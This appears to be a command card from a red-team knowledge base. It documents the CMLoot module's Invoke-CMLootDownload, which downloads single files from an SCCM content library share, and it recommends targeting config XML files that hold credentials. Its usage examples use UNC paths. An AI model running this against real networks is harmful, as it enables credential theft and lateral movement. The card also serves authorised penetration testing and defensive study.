---
id: b615b4e0-9c4d-4d4b-a01b-aadad6248388
name: invoke-cm-loot-download-single-file
type: command
executor: powershell
data: >-
  Invoke-CMLootDownload -SingleFile
  \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
output: null
created_at: '2023-04-06T03:56:08.273811+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - collection
  - sccm
verified: true
validated: true
---

# invoke-cm-loot-download-single-file

## Command

```powershell
Invoke-CMLootDownload -SingleFile $_FILE_PATH
```

## Description

This PowerShell command downloads a single specified file from an SCCM share using the CMLoot module. Ideal for targeting known sensitive files identified in prior inventory, such as XML configs containing credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -SingleFile ($_[FILE_PATH]) | Full UNC path to the file (e.g., \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml) | Yes |

## Examples

### Basic Usage

```powershell
Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
```

### Advanced Usage

```powershell
Invoke-CMLootDownload -SingleFile \\sccm01.domain.local\SCCMContentLib$\Packages\app.xml
```

## Expected Output

Progress like "Downloading file..." followed by "Download complete: MigApp.xml (size: 1.2 MB)". The file saves to the current directory; check with Get-ChildItem for verification.

## Related

- [[procedures/Active-Directory-SCCM-Loot-Inventory-and-Download]]
- [[commands/invoke-cm-loot-inventory]]
